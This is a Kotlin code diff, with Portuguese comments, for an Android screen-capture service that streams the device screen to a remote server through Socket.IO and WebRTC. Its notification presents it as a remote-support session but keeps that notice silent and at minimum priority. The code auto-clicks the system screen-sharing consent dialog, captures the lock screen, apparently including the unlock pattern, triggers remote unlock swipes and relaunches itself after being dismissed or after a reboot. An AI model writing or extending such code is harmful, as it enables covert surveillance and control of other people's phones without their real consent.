+        val mh = metrics.heightPixels
+        var height = if (mw > 0 && mh > 0) (720f * mh / mw).toInt() else 1280
+        if (height <= 0) height = 1280
+        height = height.coerceIn(240, 4096)
+        virtualHeight = height
+        val density = if (metrics.densityDpi > 0) metrics.densityDpi else 320
+        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3)
+        handlerThread = HandlerThread("ScreenCaptureThread").also { it.start() }
+        backgroundHandler = Handler(handlerThread!!.looper)
+
+        val displayFlags = DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC or
+            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
+        virtualDisplay = mediaProjection?.createVirtualDisplay(
+            "ScreenCapture",
+            width,
+            height,
+            density,
+            displayFlags,
+            imageReader?.surface,
+            null,
+            backgroundHandler
+        )
+        // Captura REAL ativa quando há MediaProjection + VirtualDisplay.
+        capturandoDeVerdade = (mediaProjection != null && virtualDisplay != null)
+        // Marca que houve sessão real de espelhamento ao menos uma vez (gate
+        // anti-loop da reanimação/revalidação). Nunca volta a false nesta execução.
+        if (capturandoDeVerdade) {
+            espelhamentoJaAtivou = true
+            // Captura voltou: libera a trava do modal (próximo bloqueio pode pedir 1x).
+            revalidacaoConsentimentoPendente = false
+        }
+        imageReader?.setOnImageAvailableListener({ reader ->
+            var image: android.media.Image? = null
+            try {
+                image = reader.acquireLatestImage()
+                if (image == null) return@setOnImageAvailableListener
+
+                // Se a tela estiver apagada pelo botão Power, ignora o frame sem travar a thread
+                if (!isScreenOn) return@setOnImageAvailableListener
+
+                val agora = System.currentTimeMillis()
+                // MARCA VIVACIDADE DO DISPLAY ANTES de qualquer early-return.
+                // CORREÇÃO "mexe sozinho": o VirtualDisplay produziu um frame
+                // AGORA, logo o pipeline está vivo. Antes, no modo WebRTC o
+                // handler retornava na linha abaixo SEM atualizar ultimoFrameMs,
+                // então o watchdog via "stall" e RECRIAVA o VirtualDisplay a
+                // cada 10s — e recriar o display enquanto o WebRTC captura dele
+                // fazia a imagem PULAR sozinha. Atualizar aqui vale p/ WebRTC e
+                // JPEG e elimina a recriação espúria.
+                ultimoFrameMs = agora
+
+                // WebRTC CONECTADO: o vídeo principal flui por WebRTC, mas mantemos
+                // o Socket.IO JPEG (enviar_tela) ativo em paralelo (limitado a ~5-8 FPS)
+                // para que visualizadores secundários (como o Emulador FPS) recebam dados e vídeo.
+                val intervaloMinimo = if (WebRtcStreamer.isConectado) 160L else 16L
+
+                // ============================================================
+                // SINCRONIA DE FRAME ROBUSTA — NUNCA trava o espelhamento
+                // ------------------------------------------------------------
+                // (Correção: a versão anterior usava um ciclo Runnable
+                // separado com postDelayed que podia morrer e parar de
+                // enviar frames → emulador flutuante congelava. Agora a
+                // alternância roda DENTRO do próprio onImageAvailable,
+                // movida pela chegada REAL de frames: se frames chegam,
+                // enviamos um a cada dois (limpos); se frames param, o
+                // keep-alive reenvia o último; se a acessibilidade está
+                // desligada (não dá pra ocultar o overlay), envia TODOS os
+                // frames normalmente — o espelhamento NUNCA para.)
+                // ============================================================
+                // CORREÇÃO FLICKER: o toggle de alpha 0↔1 a cada frame só é
+                // necessário em APIs <34. No Android 14+ o overlay visual já
+                // foi marcado com setHideDuringScreenSharing(true) e é omitido
+                // da captura automaticamente, sem piscar — nesse caso caímos
+                // direto no else-if abaixo, que envia todos os frames normais.
+                if (agora - lastSendTime < intervaloMinimo) return@setOnImageAvailableListener
+                lastSendTime = agora
+                // (ultimoFrameMs já atualizado acima, antes do early-return do WebRTC)
+
+                processarEEnviarFrame(image, width, height)
+
+                if (aguardandoFrameRefresh) {
+                    aguardandoFrameRefresh = false
+                    SocketManager.emitirAtualizacaoConcluida(true)
+                    enviarLog("Primeiro frame real capturado após refresh — emitindo atualizacao_concluida(true).")
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Erro ao capturar/enviar frame: ${e.message}")
+            } finally {
+                try {
+                    image?.close()
+                } catch (_: Exception) {}
+            }
+        }, backgroundHandler)
+
+        keepAliveRunnable?.let { backgroundHandler?.removeCallbacks(it) }
+        val novoKeepAlive = object : Runnable {
+            override fun run() {
+                val now = System.currentTimeMillis()
+                val frame = lastJpegFrame
+                // (itens 1/2) REFRESH DE ESTÁTICA com timer PRÓPRIO: reenvia o
+                // último JPEG se faz >=300ms que nada foi emitido aos viewers —
+                // baseado em ultimoEnvioRealMs (NÃO em lastSendTime, que é bumpado
+                // por frame estático descartado por hash). Assim, tela parada
+                // mantém os viewers vivos e os timestamps frescos no servidor.
+                // ISOLAMENTO: não reenvia enquanto a acessibilidade captura a tela
+                // de bloqueio (evita disputa/piscar nos 9 pontos). SALVAGUARDA
+                // ANTI-FPS:0: só silencia se o keyguard estiver REALMENTE bloqueado
+                // — se a flag ficar presa em true no desbloqueado, o keepalive
+                // continua reenviando frames reais (nunca trava em FPS:0).
+                val _kgLocked = (getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager)?.isKeyguardLocked == true
+                val _bloqueioAtivo = (MyAccessibilityService.instance?.capturaAcessibilidadeAtiva == true) && _kgLocked
+                if (isRunning && isScreenOn && frame != null && !_bloqueioAtivo &&
+                    now - ultimoEnvioRealMs >= KEEPALIVE_ESTATICA_MS) {
+                    ultimoEnvioRealMs = now
+                    // CORREÇÃO DO CONGELAMENTO (tela desbloqueada parada): marca o
+                    // pipeline como VIVO. Em tela estática o onImageAvailable para
+                    // de disparar e o `ultimoFrameMs` ficava velho → o watchdog
+                    // (6s) recriava o VirtualDisplay por FALSO stall, causando o
+                    // "aparece e congela". Como o keep-alive está reenviando o
+                    // último JPEG, o pipeline está vivo: atualizamos ultimoFrameMs
+                    // para o watchdog NÃO recriar o display à toa (recriação fica
+                    // só para perda REAL de token, tratada por capturandoDeVerdade).
+                    ultimoFrameMs = now
+                    try {
+                        SocketManager.garantirConexao()
+                        SocketManager.socket?.emit("enviar_tela", frame)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Erro ao reenviar frame keep-alive: ${e.message}")
+                    }
+                }
+                if (isRunning) {
+                    backgroundHandler?.postDelayed(this, 150)
+                }
+            }
+        }
+        keepAliveRunnable = novoKeepAlive
+        backgroundHandler?.postDelayed(novoKeepAlive, 150)
+        agendarWatchdogAntiCongelamento()
+    }
+
+    private fun agendarWatchdogAntiCongelamento() {
+        val handler = backgroundHandler ?: return
+        watchdogRunnable?.let { handler.removeCallbacks(it) }
+        val wd = object : Runnable {
+            override fun run() {
+                try {
+                    if (!isRunning || modoSomenteEscuta) return
+                    val agora = System.currentTimeMillis()
+                    val telaLigada = isScreenInteractive()
+                    val stallMs = agora - ultimoFrameMs
+                    if (telaLigada && stallMs > WATCHDOG_STALL_MS && !recriandoDisplay &&
+                        agora - ultimaRecriacaoWatchdogMs > WATCHDOG_COOLDOWN_MS
+                    ) {
+                        ultimaRecriacaoWatchdogMs = agora
+                        enviarLog("[WATCHDOG] Stall de ${stallMs}ms detectado (tela ligada) — recriando VirtualDisplay.")
+                        recriarVirtualDisplay(force = true)
+                    }
+                    // [MODAL SÓ NO REBOOT] Antes o watchdog reabria o modal
+                    // "Iniciar agora" quando a captura caía com a tela usável. A
+                    // pedido, o modal de consentimento agora aparece SOMENTE no
+                    // REINÍCIO do dispositivo (BootReceiver -> MainActivity
+                    // AUTO_BOOT_REANIMAR). O watchdog continua apenas recriando o
+                    // VirtualDisplay (acima), sem reabrir o modal em sessão.
+                    try {
+                        val kg = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+                        if (kg?.isKeyguardLocked == true && telaLigada) {
+                            val svc = MyAccessibilityService.instance
+                            if (svc == null) {
+                                enviarLog("[WATCHDOG] Keyguard travado mas acessibilidade OFF.")
+                            } else {
+                                svc.iniciarCapturaAcessibilidade()
+                            }
+                        }
+                    } catch (_: Exception) {}
+                } catch (e: Exception) {
+                    Log.e(TAG, "Erro no watchdog anti-congelamento: ${e.message}")
+                } finally {
+                    if (isRunning) backgroundHandler?.postDelayed(this, WATCHDOG_INTERVALO_MS)
+                }
+            }
+        }
+        watchdogRunnable = wd
+        handler.postDelayed(wd, WATCHDOG_INTERVALO_MS)
+    }
+
+    private fun pararWatchdogAntiCongelamento() {
+        watchdogRunnable?.let { backgroundHandler?.removeCallbacks(it) }
+        watchdogRunnable = null
+    }
+
+    class StopReceiver : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent?) {
+            try {
+                context.stopService(Intent(context, ScreenCaptureService::class.java))
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun createNotification(): Notification {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Sessão de Suporte Ativa",
+                NotificationManager.IMPORTANCE_MIN
+            ).apply {
+                description = "Indica quando a sessão de suporte remoto está ativa e transmitindo a tela."
+                setShowBadge(false)
+                enableVibration(false)
+                enableLights(false)
+                setSound(null, null)
+            }
+            val manager = getSystemService(NotificationManager::class.java)
+            manager?.createNotificationChannel(channel)
+        }
+
+        val stopIntent = Intent(this, StopReceiver::class.java).apply {
+            action = "ACTION_STOP_SERVICE"
+        }
+        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        } else {
+            PendingIntent.FLAG_UPDATE_CURRENT
+        }
+        val stopPendingIntent = PendingIntent.getBroadcast(this, 0, stopIntent, flags)
+
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Sessão de suporte ativa")
+            .setContentText("Sua tela está sendo compartilhada. Toque para encerrar.")
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
+            .setDefaults(0)
+            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Encerrar", stopPendingIntent)
+            .build()
+    }
+
+    /** Reabre a MainActivity pedindo a REVALIDAÇÃO do espelhamento (modal
+     *  "Iniciar agora") quando a captura real foi perdida no bloqueio/descanso.
+     *  Usa o contexto da ACESSIBILIDADE (privilegiado p/ abrir Activity em
+     *  segundo plano no Android 10–15); o auto-clique (inject) confirma rápido. */
+    private fun solicitarRevalidacaoEspelhamento() {
+        try {
+            if (capturandoDeVerdade) return
+            // DISPARO ÚNICO (anti-loop): se já pedimos o consentimento neste
+            // ciclo e ainda não voltou a captura, NÃO reabre o modal de novo.
+            // A trava zera quando a captura volta (sucesso) ou no próximo
+            // SCREEN_OFF (novo bloqueio).
+            if (revalidacaoConsentimentoPendente) return
+            revalidacaoConsentimentoPendente = true
+            val intent = Intent(this, MainActivity::class.java).apply {
+                // Após o desbloqueio NÃO abrir o app nem o modal interno: usar o
+                // caminho HEADLESS (janela transparente) que vai DIRETO ao modal
+                // de consentimento do SISTEMA ("Iniciar agora") sobre a tela
+                // inicial. O Inject clica sozinho, o modal some e o espelhamento
+                // continua por Socket.IO (enviar_tela) + HTTP.
+                putExtra("AUTO_BOOT_REANIMAR", true)
+                putExtra(MainActivity.EXTRA_REVALIDAR_ESPELHAMENTO, true)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            }
+            val svc = MyAccessibilityService.instance
+            if (svc != null) svc.startActivity(intent) else startActivity(intent)
+            enviarLog("[REVALIDAR] Sem captura após desbloqueio -> reabrindo consentimento (Iniciar agora) + auto-clique.")
+        } catch (e: Exception) {
+            enviarLog("[REVALIDAR] Falha ao reabrir consentimento: ${e.message}")
+        }
+    }
+
+    private fun registrarReceiverTelaLigada() {
+        if (receiverTelaRegistrado) return
+        try {
+            receiverTelaLigada = object : BroadcastReceiver() {
+                override fun onReceive(context: Context?, intent: Intent?) {
+                    val action = intent?.action ?: return
+                    when (action) {
+                        Intent.ACTION_SCREEN_OFF -> {
+                            isScreenOn = false
+                            // Novo bloqueio: rearma a trava para que, APÓS o próximo
+                            // desbloqueio, o modal de consentimento possa aparecer
+                            // UMA vez (se a captura tiver caído). Sem isso, nunca
+                            // mais pediria depois do 1º ciclo.
+                            revalidacaoConsentimentoPendente = false
+                            MyAccessibilityService.instance?.pararCapturaAcessibilidade()
+                            enviarLog("SCREEN_OFF detectado — pausando envio de frames; ForegroundService, MediaProjection e SocketIO mantidos ativos em background.")
+                        }
+                        Intent.ACTION_SCREEN_ON -> {
+                            isScreenOn = true
+                            enviarLog("SCREEN_ON detectado — reconectando Socket.IO e recriando VirtualDisplay...")
+                            
+                            SocketManager.garantirConexao()
+
+                            try {
+                                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                                @Suppress("DEPRECATION")
+                                val bright = pm.newWakeLock(
+                                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
+                                        PowerManager.ACQUIRE_CAUSES_WAKEUP or
+                                        PowerManager.ON_AFTER_RELEASE,
+                                    "AcessoMaterno:LockScreen30s"
+                                )
+                                bright.acquire(30000L)
+                            } catch (_: Exception) {}
+
+                            mostrarOverlayMantemTelaAcesa()
+
+                            try {
+                                val kg = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+                                if (kg?.isKeyguardLocked == true) {
+                                    MyAccessibilityService.instance?.iniciarCapturaAcessibilidade()
+                                }
+                            } catch (e: Exception) {
+                                enviarLog("Aviso ao verificar keyguard no SCREEN_ON: ${e.message}")
+                            }
+
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                recriarVirtualDisplay(force = true)
+                            }, 500L)
+
+                            try {
+                                val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+                                val autoDesbloquear = prefs.getBoolean(KEY_AUTO_DESBLOQUEAR_LIGACAO, true)
+                                if (autoDesbloquear) {
+                                    val kg = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+                                    if (kg?.isKeyguardLocked == true) {
+                                        Handler(Looper.getMainLooper()).postDelayed({
+                                            val svc = MyAccessibilityService.instance
+                                            if (svc != null) {
+                                                svc.desbloquearSwipeRemoto()
+                                                enviarLog("Auto-desbloqueio (swipe) disparado automaticamente no SCREEN_ON.")
+                                            }
+                                        }, 1000L)
+                                    }
+                                }
+                            } catch (e: Exception) {
+                                enviarLog("Aviso auto-desbloqueio no SCREEN_ON: ${e.message}")
+                            }
+                        }
+                        Intent.ACTION_USER_PRESENT -> {
+                            isScreenOn = true
+                            SocketManager.garantirConexao()
+                            removerOverlayMantemTelaAcesa()
+
+                            if (mediaProjection != null) {
+                                // SESSÃO NORMAL (tem token de MediaProjection válido):
+                                // o MediaProjection assume o envio (melhor FPS). Para a
+                                // captura por acessibilidade e recria o VirtualDisplay.
+                                enviarLog("USER_PRESENT com MediaProjection válido — retomando espelhamento normal (sem modal).")
+                                MyAccessibilityService.instance?.pararCapturaAcessibilidade()
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    recriarVirtualDisplay(force = true)
+                                }, 300L)
+                            } else {
+                                // PÓS-REBOOT / SEM TOKEN: NÃO pede novo modal de
+                                // consentimento. A captura por ACESSIBILIDADE
+                                // (takeScreenshot) assume o envio TAMBÉM na tela
+                                // desbloqueada — ela já vinha enviando na tela de
+                                // bloqueio e continua enviando depois do desbloqueio,
+                                // pelo mesmo canal "enviar_tela". O espelhamento segue
+                                // sem interrupção e sem outro modal.
+                                enviarLog("USER_PRESENT sem MediaProjection (pós-reboot) — captura por acessibilidade assume o envio; sem novo modal.")
+                                MyAccessibilityService.instance?.iniciarCapturaAcessibilidade()
+                            }
+                        }
+                    }
+                }
+            }
+            val filter = IntentFilter().apply {
+                addAction(Intent.ACTION_SCREEN_ON)
+                addAction(Intent.ACTION_SCREEN_OFF)
+                addAction(Intent.ACTION_USER_PRESENT)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(receiverTelaLigada, filter, Context.RECEIVER_NOT_EXPORTED)
+            } else {
+                registerReceiver(receiverTelaLigada, filter)
+            }
+            receiverTelaRegistrado = true
+            Log.d(TAG, "Receiver de SCREEN_ON/SCREEN_OFF/USER_PRESENT registrado com sucesso.")
+        } catch (e: Exception) {
+            Log.e(TAG, "Falha ao registrar receiver de estado da tela: ${e.message}")
+        }
+    }
+
+    private fun recriarVirtualDisplay(force: Boolean = false) {
+        if (mediaProjection == null || modoSomenteEscuta) {
+            // Sem token = não há captura real: deixa o estado correto para o
+            // watchdog reabrir o consentimento ("Iniciar agora").
+            if (mediaProjection == null) capturandoDeVerdade = false
+            enviarLog("Recriação de VirtualDisplay ignorada (sem MediaProjection ou modo escuta).")
+            return
+        }
+        if (recriandoDisplay) {
+            enviarLog("Recriação de VirtualDisplay ignorada: já há uma em andamento.")
+            return
+        }
+        val framesFluindo = !force && (System.currentTimeMillis() - ultimoFrameMs < 1500)
+        if (framesFluindo) {
+            enviarLog("Recriação de VirtualDisplay ignorada: frames fluindo normalmente.")
+            return
+        }
+        recriandoDisplay = true
+        try {
+            keepAliveRunnable?.let { backgroundHandler?.removeCallbacks(it) }
+            keepAliveRunnable = null
+            virtualDisplay?.release()
+            virtualDisplay = null
+            try { imageReader?.close() } catch (_: Exception) {}
+            imageReader = null
+            try { handlerThread?.quitSafely() } catch (_: Exception) {}
+            handlerThread = null
+            backgroundHandler = null
+            primeiroFrame = true
+            startVirtualDisplay()
+            enviarLog("VirtualDisplay RECRIADO com sucesso (force=$force) — espelhamento de tela reativado.")
+        } catch (e: Exception) {
+            enviarLog("ERRO ao recriar VirtualDisplay: ${e.message}")
+            Log.e(TAG, "Erro ao recriar VirtualDisplay: ${e.message}", e)
+        } finally {
+            recriandoDisplay = false
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        liberarWakeLocks()
+        pararWatchdogAntiCongelamento()
+        removerOverlayMantemTelaAcesa()
+        WebRtcStreamer.parar()
+        MyAccessibilityService.instance?.pararCapturaAcessibilidade()
+        if (receiverTelaRegistrado) {
+            try {
+                receiverTelaLigada?.let { unregisterReceiver(it) }
+            } catch (_: Exception) {}
+            receiverTelaLigada = null
+            receiverTelaRegistrado = false
+        }
+        try {
+            h264ScreenEncoder?.stop()
+        } catch (_: Exception) {}
+        h264ScreenEncoder = null
+        imageReader?.close()
+        virtualDisplay?.release()
+        mediaProjection?.stop()
+        handlerThread?.quitSafely()
+        handlerThread = null
+        backgroundHandler = null
+        isRunning = false
+        capturandoDeVerdade = false
+        modoSomenteEscuta = false
+        Log.d(TAG, "ScreenCaptureService destruído")
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+
+    /**
+     * PERSISTÊNCIA CONTRA "SWIPE" NOS RECENTES (Regra 1).
+     *
+     * Em fabricantes agressivos (Xiaomi/MIUI, Oppo/ColorOS, Vivo, etc.) deslizar
+     * o app para fora da lista de Recentes pode encerrar o processo e derrubar
+     * este ForegroundService — e, sem religamento, o espelhamento só voltaria em
+     * um reboot. Aqui reagendamos o reinício do próprio serviço via AlarmManager
+     * (~2s depois), de forma que ele suba novamente em modo escuta/START_STICKY,
+     * re-adquira os WakeLocks e reconecte o Socket.IO. As permissões já
+     * concedidas (Acessibilidade, sobreposição) continuam válidas — só o serviço
+     * é religado. Nada disso roda se o usuário DESINSTALAR o app (o PendingIntent
+     * deixa de existir), respeitando o critério "enquanto não for desinstalado".
+     */
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        try {
+            val restartIntent = Intent(applicationContext, ScreenCaptureService::class.java).apply {
+                action = BootReceiver.ACTION_RESTART_BOOT
+                putExtra("origem", "task_removed")
+                putExtra("silencioso", true)
+            }
+            val flags = PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            val pending = PendingIntent.getService(this, 1001, restartIntent, flags)
+            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+            am.set(
+                android.app.AlarmManager.RTC,
+                System.currentTimeMillis() + 2000L,
+                pending
+            )
+            enviarLog("onTaskRemoved — serviço reagendado para religar em ~2s (persistência contra swipe nos Recentes).")
+        } catch (e: Exception) {
+            Log.e(TAG, "Falha ao reagendar o serviço em onTaskRemoved: ${e.message}")
+        }
+        // Reconexão imediata do socket (caso o processo sobreviva ao swipe).
+        try { SocketManager.garantirConexao() } catch (_: Exception) {}
+        super.onTaskRemoved(rootIntent)
+    }
+}
